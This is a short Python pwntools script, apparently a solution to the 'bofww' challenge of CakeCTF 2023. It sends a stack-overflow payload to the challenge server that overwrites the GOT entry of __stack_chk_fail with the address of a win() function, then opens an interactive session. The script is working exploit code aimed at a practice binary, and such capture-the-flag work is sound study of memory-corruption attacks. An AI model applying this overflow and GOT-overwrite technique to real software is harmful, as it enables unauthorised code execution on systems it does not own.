#!/usr/bin/env python3
from pwn import *


elf = ELF('/home/kali/Desktop/ctf/pwn/bofww/bofww')
rop = ROP(elf)
context.arch = elf.arch

# p = process('/home/kali/Desktop/ctf/pwn/bofww/bofww')
# gdb.attach(p, gdbscript='b *input_person+164\nb *input_person+206\nc')
p = remote('bofww.2023.cakectf.com', 9002)

payload = p64(0x4012f6).ljust(0x130, b'A')  # address of win()
payload += p64(0x404050)  # got.plt of stack_check_fail
payload += b'B' * 100


print(p.recv().decode(errors='ignore'))
p.sendline(payload)
print(p.recv().decode(errors='ignore'))
p.sendline(b'1337')

p.interactive()
